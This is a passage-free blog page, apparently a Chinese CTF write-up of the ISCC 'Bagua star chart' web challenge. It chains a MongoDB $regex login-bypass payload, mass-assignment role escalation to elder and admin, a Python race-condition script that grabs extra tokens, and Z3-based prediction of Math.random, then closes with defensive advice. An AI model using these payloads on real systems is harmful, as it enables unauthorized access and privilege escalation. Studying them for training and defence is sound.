@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>ISCC 擂台赛八卦星图馆：NoSQL 注入、越权、竞争与随机数预测 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ISCC 擂台赛八卦星图馆：NoSQL 注入、越权、竞争与随机数预测</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 21, 2026&nbsp;&nbsp;0:45:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="ISCC-擂台赛八卦星图馆：NoSQL-注入、越权、竞争与随机数预测"><a href="#ISCC-擂台赛八卦星图馆：NoSQL-注入、越权、竞争与随机数预测" class="headerlink" title="ISCC 擂台赛八卦星图馆：NoSQL 注入、越权、竞争与随机数预测"></a>ISCC 擂台赛八卦星图馆：NoSQL 注入、越权、竞争与随机数预测</h1><h2 id="一、题目背景"><a href="#一、题目背景" class="headerlink" title="一、题目背景"></a>一、题目背景</h2><p>这道题按页面提示依次通过四关：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">乾 -&gt; 兑 -&gt; 离 -&gt; 震</span><br></pre></td></tr></table></figure>
+
+<p>每一关对应一个不同类型的 Web 安全问题。完整利用链如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MongoDB 注入登录</span><br><span class="line">-&gt; Mass Assignment 越权修改角色</span><br><span class="line">-&gt; 并发竞争获取 3 个令牌</span><br><span class="line">-&gt; 根据历史开奖恢复 Math.random 状态</span><br><span class="line">-&gt; 预测当前签号并提交</span><br></pre></td></tr></table></figure>
+
+<p>这是一道很典型的综合 Web 题，覆盖了认证绕过、权限控制、并发安全和伪随机数预测。</p>
+<h2 id="二、乾卦：NoSQL-注入登录"><a href="#二、乾卦：NoSQL-注入登录" class="headerlink" title="二、乾卦：NoSQL 注入登录"></a>二、乾卦：NoSQL 注入登录</h2><p>访问 <code>/qian</code> 后可以知道入口用户为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qingyun</span><br></pre></td></tr></table></figure>
+
+<p>后端使用 MongoDB，登录接口为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /qian/login</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
+
+<p>如果后端直接将 JSON 请求体传给 MongoDB 查询，例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="property">users</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">  <span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">  <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>并且没有限制 <code>password</code> 必须是字符串，那么就可以传入 MongoDB 查询操作符。</p>
+<p>Payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qingyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$regex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.*&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>含义是密码匹配任意内容。登录成功后拿到当前 session，身份为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apprentice</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、兑卦：Mass-Assignment-越权"><a href="#三、兑卦：Mass-Assignment-越权" class="headerlink" title="三、兑卦：Mass Assignment 越权"></a>三、兑卦：Mass Assignment 越权</h2><p>进入下一关后发现存在用户信息更新接口：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /dui/update</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
+
+<p>如果后端直接把用户提交的 JSON 合并到用户对象中，没有做字段白名单，就会出现 Mass Assignment 漏洞。</p>
+<p>提交：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;elder&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果服务端没有限制普通用户修改 <code>role</code> 字段，就可以把自己的角色提升为 <code>elder</code>，从而进入后续令牌领取流程。</p>
+<p>这个漏洞本质是权限字段被客户端控制。</p>
+<h2 id="四、离卦：并发竞争获取令牌"><a href="#四、离卦：并发竞争获取令牌" class="headerlink" title="四、离卦：并发竞争获取令牌"></a>四、离卦：并发竞争获取令牌</h2><p>下一关需要获取 3 个司命令牌。领取接口：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /li/grab</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下单线程只能领取 1 个 token，但后端领取逻辑不是原子操作，可能类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取当前用户领取数量</span><br><span class="line">-&gt; 判断是否还能领取</span><br><span class="line">-&gt; 延迟或业务处理</span><br><span class="line">-&gt; 写入 token</span><br></pre></td></tr></table></figure>
+
+<p>当多个请求并发到达时，它们可能同时通过“领取数量检查”，从而多次写入 token。</p>
+<p>利用方式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 使用 NoSQL 注入登录</span><br><span class="line">2. 通过 Mass Assignment 把角色改为 elder</span><br><span class="line">3. 复用同一个 session</span><br><span class="line">4. 使用线程池并发请求 /li/grab</span><br><span class="line">5. 收集返回 JSON 中的 token</span><br></pre></td></tr></table></figure>
+
+<p>示例代码结构：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">grab</span>():</span><br><span class="line">    r = s.post(<span class="string">&quot;http://target/li/grab&quot;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> r.json().get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">tokens = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> pool.<span class="built_in">map</span>(<span class="keyword">lambda</span> _: grab(), <span class="built_in">range</span>(<span class="number">50</span>)):</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            tokens.add(token)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tokens)</span><br></pre></td></tr></table></figure>
+
+<p>凑够 3 个 token 后进入最后一关。</p>
+<h2 id="五、震卦：Math-random-状态预测"><a href="#五、震卦：Math-random-状态预测" class="headerlink" title="五、震卦：Math.random 状态预测"></a>五、震卦：Math.random 状态预测</h2><p><code>/zhen/history</code> 返回最近开奖历史：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;current_round&quot;</span><span class="punctuation">:</span> <span class="number">157</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;round&quot;</span><span class="punctuation">:</span> <span class="number">156</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;number&quot;</span><span class="punctuation">:</span> <span class="number">763660</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>页面提示签号生成方式为：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>V8 的 <code>Math.random()</code> 使用 <code>xorshift128+</code> 生成随机数。每期虽然只泄露 <code>0 ~ 999999</code> 的整数结果，但连续历史数量足够时，可以用 Z3 对内部状态建立约束。</p>
+<p>关键注意点：</p>
+<ul>
+<li><code>/zhen/history</code> 返回顺序是新到旧，求解时要反转为旧到新。</li>
+<li>每个历史 <code>number</code> 对应一个随机浮点数区间，而不是完整随机数。</li>
+<li>恢复初始状态后，需要按历史数量推进到当前轮。</li>
+<li>最后用当前状态计算本轮预测值。</li>
+</ul>
+<h2 id="六、提交预测"><a href="#六、提交预测" class="headerlink" title="六、提交预测"></a>六、提交预测</h2><p>预测接口：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /zhen/predict</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
+
+<p>请求体：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;round&quot;</span><span class="punctuation">:</span> <span class="number">157</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;number&quot;</span><span class="punctuation">:</span> <span class="number">123456</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tokens&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;token1&quot;</span><span class="punctuation">,</span> <span class="string">&quot;token2&quot;</span><span class="punctuation">,</span> <span class="string">&quot;token3&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果预测正确但提示权限不足，可以继续利用 <code>/dui/update</code> 把角色改成：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后重新提交预测，得到最终结果。</p>
+<h2 id="七、自动化脚本思路"><a href="#七、自动化脚本思路" class="headerlink" title="七、自动化脚本思路"></a>七、自动化脚本思路</h2><p>完整自动化脚本可以按以下步骤写：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. NoSQL 注入登录 qingyun</span><br><span class="line">2. 修改角色为 elder</span><br><span class="line">3. 并发请求 /li/grab 获取 3 个 token</span><br><span class="line">4. 请求 /zhen/history 获取历史开奖</span><br><span class="line">5. 使用 Z3 恢复 Math.random 状态</span><br><span class="line">6. 预测当前轮 number</span><br><span class="line">7. 修改角色为 admin</span><br><span class="line">8. 提交 /zhen/predict</span><br></pre></td></tr></table></figure>
+
+<p>依赖：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests z3-solver</span><br></pre></td></tr></table></figure>
+
+<h2 id="八、漏洞总结"><a href="#八、漏洞总结" class="headerlink" title="八、漏洞总结"></a>八、漏洞总结</h2><p>这道题不是单点漏洞，而是多漏洞链式利用：</p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>漏洞类型</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>乾卦</td>
+<td>NoSQL 注入</td>
+<td>绕过登录</td>
+</tr>
+<tr>
+<td>兑卦</td>
+<td>Mass Assignment</td>
+<td>修改角色</td>
+</tr>
+<tr>
+<td>离卦</td>
+<td>条件竞争</td>
+<td>超额领取 token</td>
+</tr>
+<tr>
+<td>震卦</td>
+<td>伪随机数预测</td>
+<td>预测签号</td>
+</tr>
+</tbody></table>
+<p>每个漏洞单独看都不一定直接拿到结果，但组合起来就形成了完整攻击路径。</p>
+<h2 id="九、防护建议"><a href="#九、防护建议" class="headerlink" title="九、防护建议"></a>九、防护建议</h2><h3 id="1-NoSQL-注入防护"><a href="#1-NoSQL-注入防护" class="headerlink" title="1. NoSQL 注入防护"></a>1. NoSQL 注入防护</h3><ul>
+<li>限制字段类型，密码必须是字符串。</li>
+<li>禁止用户输入对象操作符。</li>
+<li>使用固定查询结构和参数校验。</li>
+</ul>
+<h3 id="2-Mass-Assignment-防护"><a href="#2-Mass-Assignment-防护" class="headerlink" title="2. Mass Assignment 防护"></a>2. Mass Assignment 防护</h3><ul>
+<li>更新用户信息时使用字段白名单。</li>
+<li><code>role</code>、<code>isAdmin</code>、<code>uid</code> 等敏感字段不允许客户端修改。</li>
+<li>权限变更必须走单独审核流程。</li>
+</ul>
+<h3 id="3-条件竞争防护"><a href="#3-条件竞争防护" class="headerlink" title="3. 条件竞争防护"></a>3. 条件竞争防护</h3><ul>
+<li>令牌领取逻辑使用数据库原子操作。</li>
+<li>对关键资源加锁。</li>
+<li>领取次数检查和写入必须在同一事务中完成。</li>
+</ul>
+<h3 id="4-随机数安全"><a href="#4-随机数安全" class="headerlink" title="4. 随机数安全"></a>4. 随机数安全</h3><ul>
+<li>不使用 <code>Math.random()</code> 生成安全相关结果。</li>
+<li>使用密码学安全随机数。</li>
+<li>不向客户端暴露过多历史随机输出。</li>
+</ul>
+<h2 id="十、复盘"><a href="#十、复盘" class="headerlink" title="十、复盘"></a>十、复盘</h2><p>这道题很适合训练综合 Web 思维。它提醒我：真实攻击链里经常不是一个漏洞直接打穿，而是认证、权限、并发和业务逻辑连续出现小问题，最终被串成完整路径。</p>
+<p>做这类题时，建议按业务流程走，不要只盯单个接口。每进入一个新状态，都重新观察页面、接口、角色和返回内容，往往能发现下一段链路。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://forkmmat.github.io/2026/05/21/ISCC%E6%93%82%E5%8F%B0%E8%B5%9B-%E5%85%AB%E5%8D%A6%E6%98%9F%E5%9B%BE%E9%A6%86-NoSQL%E6%B3%A8%E5%85%A5%E8%B6%8A%E6%9D%83%E7%AB%9E%E4%BA%89%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B/">https://forkmmat.github.io/2026/05/21/ISCC%E6%93%82%E5%8F%B0%E8%B5%9B-%E5%85%AB%E5%8D%A6%E6%98%9F%E5%9B%BE%E9%A6%86-NoSQL%E6%B3%A8%E5%85%A5%E8%B6%8A%E6%9D%83%E7%AB%9E%E4%BA%89%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ISCC/"># ISCC</a>
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/NoSQL%E6%B3%A8%E5%85%A5/"># NoSQL注入</a>
+                    
+                        <a href="/tags/%E8%B6%8A%E6%9D%83/"># 越权</a>
+                    
+                        <a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"># 条件竞争</a>
+                    
+                        <a href="/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B/"># 随机数预测</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/05/21/ISCC%E5%86%B3%E8%B5%9B-Agent%E6%8F%92%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">ISCC 决赛 Agent 插件管理系统：Java 反序列化任意文件读取</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
